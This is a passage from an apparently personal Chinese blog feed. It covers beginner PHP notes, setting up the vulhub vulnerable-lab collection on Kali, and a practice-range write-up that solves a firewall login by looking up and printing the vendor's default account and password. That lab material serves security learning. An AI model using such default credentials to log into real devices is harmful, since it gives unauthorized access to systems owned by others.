title="变量传值"></a>变量传值</h2><p>将一个变量赋值给另外一个变量。</p><p>值传递<code>$</code>：将变量保存的值复制一份，然后将新的值给另外一个变量保存（两个变量没有关系）</p><p>引用传递<code>&amp;</code>：将变量保存在值所在的内存地址，传递给另外一个变量，两个变量指向同一块内存空间（两个变量是同一个值）</p><p>内存分区：</p><p>栈区：程序可以操作的内存部分（不存数据，运行程序代码），少但是快</p><p>代码段：存储程序的内存部分（不执行）</p><p>数据段：存储普通数据（全局区和静态区）</p><p>堆区：存储复杂数据，大但效率低</p><pre><code class="hljs">&lt;?php    $a=10;    $b=$a;    $b=5;    echo $a,$b,'&lt;br/&gt;';    $c=10;    $d=&amp;$c;    $c=5;    echo $c,$d,'&lt;br/&gt;';?&gt;</code></pre><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>保存数据</p><p>常量：const/constant，一种在程序运行中，不可改变的量（数据）</p><p>常量定义后不可改变</p><h2 id="常量定义形式"><a href="#常量定义形式" class="headerlink" title="常量定义形式"></a>常量定义形式</h2><ol><li><p>定义常量的函数：define(‘常量名’,常量值);</p></li><li><p>const常量名</p><p> define(‘PI’,3.14);<br> const PII=3;</p></li></ol><h2 id="常量的命名规则"><a href="#常量的命名规则" class="headerlink" title="常量的命名规则"></a>常量的命名规则</h2><ol><li>不需要$</li><li>由字母、数字、下划线组成，不能以数字开头</li><li>通常都是大写字母，不区分大小写，但是要跟变量区分开</li><li>特殊常量只能用define定义</li></ol><h2 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h2><pre><code class="hljs">PHP_VERSION # php版本号PHP_INT_SIZE # 整型大小PHP_INT-MAX # 整型能表示的最大值（允许出现负数：带符号）</code></pre><p>系统魔术常量：</p><pre><code class="hljs">__常量名__</code></pre><p>魔术常量值通常会跟着环境变化，但用户改变不了</p><pre><code class="hljs">__DIR__ # 当前被执行的脚本所在的绝对路径__FILE__ # 当前被执行的脚本所在的绝对路径__LINE__ # 当前所属的行数__NAMESPACE__ # 当前所属的命名空间__CLASS__ # 当前所属的类__METHOD__ # 当前所属的方法</code></pre><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><pre><code class="hljs">data type </code></pre><p>在php中指的是存储的数据本身的类型，而不是变量的类型。php是一种弱类型语言，变量本身没有数据类型。</p><h2 id="八种数据类型"><a href="#八种数据类型" class="headerlink" title="八种数据类型"></a>八种数据类型</h2><ul><li>基本数据类型：<ul><li>整型：int/integer，系统分配4个字节存储，表整数类型</li><li>浮点型：float/double，系统分配8个字节存储，表小数或整型存不下的整数</li><li>字符串型：string，系统根据实际长度分配，表示字符串(引号)</li><li>布尔类型：bool/boolean，表布尔类型</li></ul></li><li>复合数据类型：<ul><li>对象类型：object，存放对象</li><li>数组类型：array，存储多个数据（一次性）</li></ul></li><li>特殊数据类型<ul><li>资源类型：resource，存放资源数据（php外部数据，如数据库、文件）</li><li>空类型：NULL，只有一个值就是NULL(不能运算)</li></ul></li></ul><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><ul><li>自动转换</li><li>手动转换（强制）：认为根据需要的目标类型转换<ul><li>强制转换规则：在变量之前增加一个括号(),然后在里面写上对应类型：int/integer,其中NULL类型用到unser()结构</li></ul></li><li>布尔true为1，false为0</li><li>字符串转数值<ul><li>以字母开头的字符串，永远为0</li><li>以数字开头的字符串，取到碰到字符串为止（不会同时包含两个小数点）</li></ul></li></ul><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//数据类型</span><br><span class="hljs-comment">//创建数据</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">'abc1.1.1'</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">'1.1.1abd'</span>;<br><span class="hljs-comment">//自动转换</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span> + <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">//强制转换</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;br/&gt;'</span>,(<span class="hljs-keyword">float</span>)<span class="hljs-variable">$a</span>,(<span class="hljs-keyword">float</span>)<span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br>注：运行完页面有warning<br></code></pre></td></tr></tbody></table></figure><h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><p>通过类型判断函数来判断变量，最终返回这个变量所保存数据的数据类型：是一组以is_开头后面跟类型名字的函数：is_XXX(变量名)</p><p>Bool类型不能用echo查看，可以用var_dump结构查看</p><blockquote><p>echo只能输出变量的值,var_dump能将变量的值和类型同事输出</p></blockquote><pre><code class="hljs">var_dump(变量1,变量2)var_dump(is_int($a));var_dump(is_string($a)); # bool(false) bool(true)</code></pre><ul><li>gettype(变量名) ：获取类型，得到该类型对应字符串</li><li>settype(变量名，类型)：设定数据类型，与强制转换不同<ul><li>强制转换变量名，是对数据值复制的内容进行处理（不会处理实际存储的内容）</li><li>settype会直接改变数据本身</li></ul></li></ul><figure class="highlight elm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">echo</span> get<span class="hljs-keyword">type</span>($a); #string<br><span class="hljs-title">var_dump</span>(set<span class="hljs-keyword">type</span>($b,'int'));<br><span class="hljs-title">echo</span> get<span class="hljs-keyword">type</span>($b),$b; # stringbool(true) integer 1<br></code></pre></td></tr></tbody></table></figure><h2 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h2><p>4字节，最大32位，有符号类型（区分正负数）</p><p>四种整型定义：</p><pre><code class="hljs">$a=120 # 十进制$a=0b110 # 二进制$a=0120 # 八进制$a=0x120 # 十六进制</code></pre><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><pre><code class="hljs">Decbin() # 十转二Decoct() # 十转八Dechex() # 十转十六Bindec() # 二转十</code></pre><p>栗子：<br>    var_dump(decbin(107)) # string(7) “110101</p><h2 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h2><p>精度范围大概在15个有效数字左右</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$f1</span>=<span class="hljs-number">1.23</span>; <span class="hljs-comment"># float(1.23)</span><br><span class="hljs-variable">$f2</span>=<span class="hljs-number">1.23e10</span>; <span class="hljs-comment"># float(12300000000)</span><br><span class="hljs-variable">$f3</span>=PHP_INT_MAX +<span class="hljs-number">1</span>; <span class="hljs-comment"># float(9.2233720368548E+18) </span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$f1</span>,<span class="hljs-variable">$f2</span>,<span class="hljs-variable">$f3</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><h2 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h2><pre><code class="hljs">$b1=True;$b2=False;var_dump($b1,$b2);</code></pre><p>在进行某些数据判断时,要特别注意类型转换:</p><pre><code class="hljs">empty() # 判断数据的值是否为空,不是NULL,若为空返回true,不为空返回falselsset() # 判断数据存储的变量本身是否存在,存储</code></pre><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p>运算符:operator</p><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><pre><code class="hljs">= 赋值运算,将右边结果保存到内存的某个位置,将位置的内存地址赋值给左侧的变量</code></pre><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>加 <code>+</code></p><p>减 <code>-</code></p><p>乘 <code>*</code></p><p>除 <code>/</code></p><p>取余 <code>%</code></p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$b</span>=<span class="hljs-number">10</span>; <span class="hljs-regexp">//</span>连贯赋值运算：俩变量不同<br><span class="hljs-variable">$c</span>=<span class="hljs-number">0</span>;<br>var_dump(<span class="hljs-variable">$a</span>/<span class="hljs-number">2</span>);<br></code></pre></td></tr></tbody></table></figure><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>比较两个数据大小<br><code>&gt;、&gt;=、&lt;、&lt;=、==、!=、===、!==</code></p><p><code>===</code> 全等于，左右大小和类型都相同。</p><p><code>!==</code> 不全等于，只有大小或者类型不同。</p><pre><code class="hljs">$a='123';$b=123;var_dump($a==$b); // Truevar_dump($a===$b);// False</code></pre><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><ul><li>逻辑与：<code>&amp;&amp;</code> 全真为真</li><li>逻辑或：<code>||</code> 一真为真</li><li>逻辑非：<code>!</code> 取反</li></ul><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span>=<span class="hljs-string">'weekend'</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">'goods'</span>;<br>var_dump(<span class="hljs-variable">$a</span> &amp;&amp; <span class="hljs-variable">$b</span>);<span class="hljs-regexp">//</span> True<br>var_dump(<span class="hljs-variable">$a</span> || <span class="hljs-variable">$b</span>);<span class="hljs-regexp">//</span> True<br>var_dump(!(<span class="hljs-variable">$b</span>==<span class="hljs-string">'good'</span>));<span class="hljs-regexp">//</span> True<br></code></pre></td></tr></tbody></table></figure><p>逻辑与和逻辑或又称为短路运算，若第一个表达式结果已经满足条件，那么就不会运行逻辑运算符后面的表达式。</p><h2 id="连接运算符"><a href="#连接运算符" class="headerlink" title="连接运算符"></a>连接运算符</h2><p>将字符串拼接：<code>.</code><br>    .= 复合运算，将左右连接，然后重新赋值给左边。</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span>=<span class="hljs-string">'hello '</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-number">123</span>;<br>echo <span class="hljs-variable">$a</span> . <span class="hljs-variable">$b</span>,<span class="hljs-string">'&lt;hr/&gt;'</span>; <span class="hljs-regexp">//</span>将a和b连接起来<br><span class="hljs-variable">$a</span> .= <span class="hljs-variable">$b</span>; <span class="hljs-regexp">//</span><span class="hljs-variable">$a</span>=<span class="hljs-variable">$a</span> . <span class="hljs-variable">$b</span><br>echo <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></tbody></table></figure><h2 id="错误抑制符"><a href="#错误抑制符" class="headerlink" title="错误抑制符"></a>错误抑制符</h2><p>在php中一些错误可以提前预知，但错误无法避免，又不希望报错给用户，可以使用错误抑制扶处理。</p><pre><code class="hljs">@ 在可能出错的表达式前面使用即可</code></pre><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$a</span>=10;</span><br><span class="hljs-meta"><span class="hljs-keyword">$b</span>=0;</span><br>@(<span class="hljs-symbol">$</span>a/<span class="hljs-symbol">$</span>b);<br></code></pre></td></tr></tbody></table></figure><p>错误抑制符通常在生产环境用到；</p><h2 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h2><p>有三个表达式参与的运算（简单的分支结构缩写）</p><p>语法格式： 表达式1 ? 表达式2 : 表达式3;</p><p>运算：若1成立，那么执行2，否则执行3；</p><pre><code class="hljs">$a=10;$b=$a&gt;10?100:0;echo $b;</code></pre><h2 id="自操作运算符"><a href="#自操作运算符" class="headerlink" title="自操作运算符"></a>自操作运算符</h2><p><code>++ --</code></p><pre><code class="hljs">$a=1;$a++;//++$a;//前置后置若本身只有自操作不参与其他运算，那么效果相同$a=1;$b=$a++; // $a++会导致$a=$a+1=2;$b=1$c=++$a; // ++$a会导致$a=$a+1=2;$c=2后置自操作：先将自己所保存的值留下来，然后改变自己，自己给别人原来的值前置自操作：先改变自己，然后将改变后的值传递。&lt;?php$a=$b=1;$a++;//++$b;echo $a,'&lt;br/&gt;',$b;echo '&lt;br/&gt;',$a++,'&lt;br/&gt;',++$b;echo '&lt;br/&gt;',$a,$b;?&gt;/+=: 左边结果与右边结果相加后赋值给左边/-=: 左边减去右边的结果赋值给左边</code></pre><h1 id="计算机码"><a href="#计算机码" class="headerlink" title="计算机码"></a>计算机码</h1><p>计算机码：原码、反码、补码，数值本身最左边一位是用来充当符号位：正数为0，负数为1</p><p>原码：数据本身从十进制转换成二进制得到的结果</p><ul><li>正数：左符号位为0</li><li>负数：左符号位为1</li></ul><p>反码：针对负数，符号位不变，其他位取反</p><p>补码：针对负数，反码+1</p><p>系统中存在两个0：</p><ul><li><code>+0</code> : 00000000</li><li><code>-0</code> : 10000000 原码</li></ul><p>取反： 11111111</p><p>补码：00000000</p><h1 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h1><p>取出计算机中最小的单位(位bit)进行运算</p><p><code>&amp;</code> ：按位与，11则1</p><p><code>|</code> : 按位或，有1则1</p><p><code>~</code> : 按位非，1则0，0则1</p><p><code>^</code> : 按位异或，相同则0，不同则1</p><p><code>&lt;&lt;</code> : 按位左移，整个位(32位)，左移一位，右边补0(乘以2)</p><p><code>&gt;&gt;</code> : 按位右移，整个位右移，左边补符号位对应内容(正数补0，负数补1)（除以2）</p><p>注意：</p><ol><li>系统进行任何位运算的时候都是使用补码</li><li>运算结束之后都必须转换原码才是最终显示数据</li></ol><h1 id="优先级略"><a href="#优先级略" class="headerlink" title="优先级略"></a>优先级略</h1><h1 id="条件判断语句"><a href="#条件判断语句" class="headerlink" title="条件判断语句"></a>条件判断语句</h1><h2 id="if条件判断语句"><a href="#if条件判断语句" class="headerlink" title="if条件判断语句"></a>if条件判断语句</h2><pre><code class="hljs">if(条件表达式){    //执行代码段；}else{    //执行代码段；}if(条件表达式1){    //执行代码段；}elseif(条件表达式2){    //执行代码段；}else{    //执行代码段；}</code></pre><p>栗子：</p><pre><code class="hljs">&lt;?php    $day='sunday';    if($day=='sunday'){        echo 'play';    }else{        echo 'work';    }?&gt;&lt;?php    $day='sunday';    if($day=='sunday'){        echo 'play';    }elseif($day='Saturday'){        echo 'play!';    }else{        echo 'work';    }?&gt;</code></pre><h2 id="Switch分支语句"><a href="#Switch分支语句" class="headerlink" title="Switch分支语句"></a>Switch分支语句</h2><pre><code class="hljs">switch(条件表达式){    case 值1:        代码段；        break;    case 值2:        代码段；        break;    …    default:        //匹配失败的代码;        break;}</code></pre><p>栗子：</p><pre><code class="hljs">&lt;?php    $day=1;    switch ($day) {        case 1:            echo '1';            break;        case 2:            echo '2';            break;        case 3:            echo '3';            break;        default:            echo 'error';            break;    }?&gt;</code></pre><h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><pre><code class="hljs">for([条件1];[条件2];[条件3]){    //条件1：初始化，可以多种赋值语句，逗号分开    //条件2：边界判断，限定循环执行次数    //条件3：执行条件变化    循环体；}</code></pre><p>栗子：</p><pre><code class="hljs">&lt;?php    for($i=1;$i&lt;=10;$i++){        echo $i,'&lt;br/&gt;';    }?&gt;&lt;?php    for($i=1,$end=10;$i&lt;=$end;$i++){        echo $i,'&lt;br/&gt;';    }?&gt;</code></pre><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><pre><code class="hljs">条件初始化；while(条件表达式){    //条件表达式就是判断边界条件    循环体；}</code></pre><p>例：</p><pre><code class="hljs">&lt;?php    $i=1;    while($i&lt;=10){        echo $i++,'&lt;br/&gt;';    }?&gt;</code></pre><p>do-while循环：先执行循环体后判断条件</p><pre><code class="hljs">do{    循环体}while(条件表达式)</code></pre><p>例：</p><pre><code class="hljs">&lt;?php    $i=1;    do{        if($i%2==0){            echo $i,'&lt;br/&gt;';            }    $i++;    }while($i&lt;=10);?&gt;</code></pre><h2 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h2><p>中断控制：continue</p><p>终止控制：break</p><pre><code class="hljs">&lt;?php    //输出1-100之间5的倍数    $i=1;    while($i&lt;=100){        if($i%5==0){            echo $i++,'&lt;br/&gt;';        }        $i++;        continue;        //break; 终止循环    }?&gt;</code></pre><ul><li><code>continue 2;</code> 当前自己循环后面内部不再执行，同时外部循环如果还有循环体也不再执行，重新来过。</li><li><code>break 2;</code> 当前循环和次外一层循环都结束</li></ul><h1 id="流程控制替代语法"><a href="#流程控制替代语法" class="headerlink" title="流程控制替代语法"></a>流程控制替代语法</h1><p>分支和循环结构的替代语法</p><p>php本身是嵌入到html中的脚本语言，需要在html中书写一些关于判断或者循环的结构语法，必须符合php标签规范，需要html和php进行混搭，如果使用原始的php代码那么会非常不美观。</p><p>例子：打印九九乘法表，使用表格来展示。</p><pre><code class="hljs">&lt;table border=1&gt;    &lt;?php for($i=1;$i&lt;10;$i++){?&gt;        &lt;tr&gt;            &lt;?php for($j=1;$j&lt;=$i;$j++){?&gt;                &lt;td&gt;                    &lt;?php echo $i.' * '.$j.' = '.$i*$j;?&gt;                &lt;/td&gt;            &lt;?php }?&gt;        &lt;/tr&gt;    &lt;?php }?&gt;&lt;/table&gt;</code></pre><p>在php书写html中大括号<code>{}</code>不美观，所以php提供了一种替代机制：</p><pre><code class="hljs">for(;;){ -&gt;  for(;;):}        -&gt;  endfor;</code></pre><p>例子：</p><pre><code class="hljs">&lt;?php for($j=1;$j&lt;=$i;$j++):?&gt;    &lt;td&gt;        &lt;?php echo $i.' * '.$j.' = '.$i*$j;?&gt;    &lt;/td&gt;&lt;?php endfor;?&gt;</code></pre><p>左大括号用冒号替代</p><p>右大括号使用end+对应实际标记替代</p><pre><code class="hljs">if(): endif;switch: endswitch;</code></pre><h1 id="常用系统函数"><a href="#常用系统函数" class="headerlink" title="常用系统函数"></a>常用系统函数</h1><h3 id="输出函数"><a href="#输出函数" class="headerlink" title="输出函数"></a>输出函数</h3><pre><code class="hljs">print() # 类似echo输出，本质时一种结构，返回1，可以不用括号print_r() # 类似var_dump，但比var_dump简单，不会输出数据类型，指挥输出值 &lt;?php    echo print('hello&lt;br/&gt;');    print 'hello1&lt;br/&gt;';    $a='hello1&lt;br/&gt;';    print_r($a);?&gt;</code></pre><h3 id="时间函数"><a href="#时间函数" class="headerlink" title="时间函数"></a>时间函数</h3><pre><code class="hljs">date() # 按照指定格式对对应的时间戳（从1970年格林统治时间开始计算的秒数）time() # 获取当前时间对应的时间戳(返回1970年1月1日00：00：00到当前时间的秒数）microtimw() # 获取微秒级别的时间strtotime() # 按照规定格式的字符串转换成时间戳echo date('Y 年 m 月 d 日 H:i:s&lt;br/&gt;',12345678);echo time(),'&lt;br/&gt;';echo microtime();echo strtotime('tomorrow 10 hours');结果:1970 年 05 月 24 日 05:21:181671415876/0.29940200 16714158761671501600 </code></pre><h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><pre><code class="hljs">max() # 返回参数最大值min() # 返回参数最小值rand() # 返回一个随机值mt_rand() # 与rand一样,但底层结构不同,效率高于randround() # 四舍五入ceil() # 向上取整floor() # 向下取整pow() # 求指定数字的指定指数次结果abs() # 求绝对值sqrt() # 求平方根</code></pre><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><pre><code class="hljs">function_exists() # 判断指定函数名字是否在内存中存在func_get_arg() # 在自定义函数种获取指定数值对应的参数func_get_args() # 在自定义函数中获取所有的参数(数组)func_num_args() # 获取当前自定义函数的参数数量</code></pre><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>文件包含：在php脚本中，去将另一个文件(php)包含进来，去合作完成一件事情</p><p>文件包含作用：</p><ol><li>要么使用被包含文件中的内容，实现代码共享(重用)：向上包含(索要)<ol><li>向上包含：在当前脚本要用某个代码之前包含别的文件</li></ol></li><li>要么自己有东西可以给别的文件使用，实现代码的共享（重用）：向下包含(给予)<ol><li>向下包含：在自己有某个东西的时候，需要别的脚本来显示（自己代码写完之后包含其他文件）</li></ol></li></ol><p>最大作用：分工协作，每个脚本做的事情不一样，因此可以使用协作方式，让多个脚本共同完成一件事情</p><h2 id="文件包含四种形式"><a href="#文件包含四种形式" class="headerlink" title="文件包含四种形式"></a>文件包含四种形式</h2><pre><code class="hljs">include # 包含文件include_once # 系统自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次）requrie # 与include相同require_once # 与include_once相同</code></pre><p>包含基本语法：</p><pre><code class="hljs">include '文件名字';include('文件名字');</code></pre><p>例：(向上包含：先包含文件，后使用文件中内容，运行demo2.php)</p><p>demo1.php</p><pre><code class="hljs">&lt;?php//被包含数据$a=1;define('PI',3.14);?&gt;</code></pre><p>demo2.php</p><pre><code class="hljs">&lt;?php//包含文件include 'demo1.php'; //包含当前文件demo2.php所在文件夹下的demo1.phpecho $a,'&lt;br/&gt;',PI;?&gt;</code></pre><p>例：（向下包含：先准备内容，然后包含另外的文件，在另外的文件中使用当前内容,运行demo1.php）</p><p>demo1.php</p><pre><code class="hljs">&lt;?php//被包含数据$a=10;const PI=3.14;include_once 'demo2.php';?&gt;</code></pre><p>demo2.php</p><pre><code class="hljs">&lt;table&gt;    &lt;tr&gt;        &lt;td&gt;&lt;?php echo $a;?&gt;&lt;/td&gt;        &lt;td&gt;&lt;?php echo PI;?&gt;&lt;/td&gt;    &lt;/tr&gt;&lt;/table&gt;</code></pre><h2 id="文件加载原理"><a href="#文件加载原理" class="headerlink" title="文件加载原理"></a>文件加载原理</h2><p>php代码执行流程：</p><ol><li>读取代码文件（php程序）</li><li>编译：将php代码转换成字节码(生成opcode)</li><li>zendengine解析opcode，按照字节码去进行逻辑运算</li><li>转换成对应的html代码</li></ol><p>文件加载原理：</p><ol><li>在文件加载时，系统会自动的将被包含文件中的代码相当于嵌入到当前文件中</li><li>加载位置，在哪加载，对应的文件中的代码嵌入位置就是对应的include位置</li><li>在php中被包含的文件是单独进行编译的</li></ol><p>php文件在编译过程中如果出现语法错误，那么会失败(不会执行)；但如果被包含文件有错误的时候，系统会在执行到包含include这条语句的时候才会报错。</p><h2 id="include-和-require区别"><a href="#include-和-require区别" class="headerlink" title="include 和 require区别"></a>include 和 require区别</h2><p>include 和 include_once的区别：</p><p>include：系统会碰到一次执行一次，若对统一个文件进行多次加载，那么系统会执行多次；</p><p>include_once：系统碰到多次，也只会执行一次。</p><p>require 和include的区别，本质都是包含文件，唯一的区别在于包含不到文件时候，报错形式不一样</p><p>include错误级别比较轻，不会阻止代码运行</p><pre><code class="hljs">include 'a.php';require 'a.php';</code></pre><h2 id="文件包加载路径"><a href="#文件包加载路径" class="headerlink" title="文件包加载路径"></a>文件包加载路径</h2><p>文件在加载时候需要指定文件路径才能保证php正确的找到对应的文件。</p><ul><li>绝对路径：<ul><li>从磁盘的根目录开始（本地绝对路径）</li><li>windows C:/路径/PHP文件</li><li>Linux /路径/PHP文件</li><li>从网站根目录开始（网络绝对路径）</li><li><code>/</code>相对于网站主机名字对应的路径</li><li><code>localhost/index.php -&gt; E:/server/apache/htdocs/index.php</code></li></ul></li><li>相对路径：从当前文件所在目录开始的路径<ul><li><code>.|./</code> 表示当前文件夹</li><li><code>../</code> 上级目录（当前文件夹的上一层文件夹）</li></ul></li></ul><p>绝对路径和相对路径的加载区别</p><ol><li>绝对路径相对效率偏低，但是相对安全（路径不会出问题）</li><li>相对路径相对效率高，但是容易出错（相对路径会发生改变）</li></ol><p>例：</p><pre><code class="hljs">//相对路径加载include_once 'demo2.php';//默认当前文件本身echo $a;include_once './demo2.php';//当前目录文件夹</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali安装vulhub</title>
    <link href="/2022/11/21/Kali%E5%AE%89%E8%A3%85vulhub/"/>
    <url>/2022/11/21/Kali%E5%AE%89%E8%A3%85vulhub/</url>
    
    <content type="html"><![CDATA[<p>再搭一个靶场，基于docker和docker-compose的漏洞环境集合。</p><h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>切root用户：</p><pre><code class="hljs">apt-get update #更新apt-get install -y apt-transport-https ca-certificates #安装https协议、CA证书apt install docker.io # 安装dockerdocker -v # 查看是否安装成功systemctl start docker # 启动dockerdocker ps -a # 查看docker信息</code></pre><h1 id="安装pip和docker-compose"><a href="#安装pip和docker-compose" class="headerlink" title="安装pip和docker-compose"></a>安装pip和docker-compose</h1><pre><code class="hljs">apt-get install python3-pip # 安装pippip3 install docker-compose # 安装docker-composedocker-compose -v # 查看版本信息</code></pre><h1 id="安装vulhub"><a href="#安装vulhub" class="headerlink" title="安装vulhub"></a>安装vulhub</h1><pre><code class="hljs">git clone https://github.com/vulhub/vulhub.git # 下载vulhubcd vulhub lscd rails/CVE-2019-5418 # 随便进入一个靶场docker-compose up -d # 开启靶场环境</code></pre><p>哦豁，失败，我就说我怎么可能搭建环境这么顺利。<br>切换了root，就可以了，等了好一会儿开启</p><p><img src="https://s2.loli.net/2022/11/22/3uqSHPgRDlUCNpY.png" alt="image.png"></p><p>查看靶场启动环境 <code>docker-compose ps -a</code><br>查看该环境运行的端口</p><p>然后连接一下网址：<code>http://kali的ip:端口/</code></p><p><img src="https://s2.loli.net/2022/11/22/D8ap4yEcRSrixnO.png" alt="image.png"></p><p>关闭环境：<code>docker-compose down</code></p><p><img src="https://s2.loli.net/2022/11/22/jInPGpJxXWTs2cA.png" alt="image.png"></p><pre><code class="hljs">重启docker：systemctl restart docker关闭docker：systemctl stop dockersystemctl stop docker.socket查看docker运行时状态：systemctl status docker</code></pre><p>（这次搭建靶场顺利到不可思议！！！）</p>]]></content>
    
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>vulhub</tag>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶场：某防火墙默认口令</title>
    <link href="/2022/11/15/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/"/>
    <url>/2022/11/15/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>安全工程师”墨者”对某公司进行授权测试时，扫描公网IP时发现当前公司在网络边界部署了某型号防火墙，并且公网可以访问防火墙的WEB页面。</p><p>实训目标</p><ol><li>掌握查看当前设备类型的方法；</li><li>了解网络（安全）设备的登录控制方式；</li><li>了解网络（安全）设备的默认口令获取方式；</li><li>了解当前型号防火墙的不同账户的区别；</li><li>了解在网络信息安全中的权限最小化、权限分离作用；</li></ol><p>解题方向</p><p>找到防火墙的默认口令进行登录。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>题目给了一个登录界面，我注意到题目标题：天清汉马，那就百度搜了一下天清汉马防火墙的默认账号密码</p><p>账号：useradmin</p><p>密码：venus.user</p><p>然后……就拿到key了！</p><pre><code class="hljs">KEY: mozhedf5bfbb87e52d81d6c658bda251</code></pre><p>说实话这不值得我花三个币！！！</p><h1 id="拓展-防火墙"><a href="#拓展-防火墙" class="headerlink" title="拓展 防火墙"></a>拓展 防火墙</h1><p>防火墙是指设置在不同网络或网络安全域之间的一系列部件的组合，它可以通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现网络的安全保护，在逻辑上，防火墙是一个分离器，一个限制器，也是一个分析器，有效的监控了内部网和Internet之间的任何活动，保证了内部网络的安全。</p><p>防火墙，一个硬件设备或软件系统，主要架设在内部网络和外部网络间，为了防止外界恶意程序对内部系统的破坏，或者组织内部重要信息向外流出，有双向监督的功能。</p><h2 id="防火墙的分类及原理"><a href="#防火墙的分类及原理" class="headerlink" title="防火墙的分类及原理"></a>防火墙的分类及原理</h2><h3 id="包过滤技术"><a href="#包过滤技术" class="headerlink" 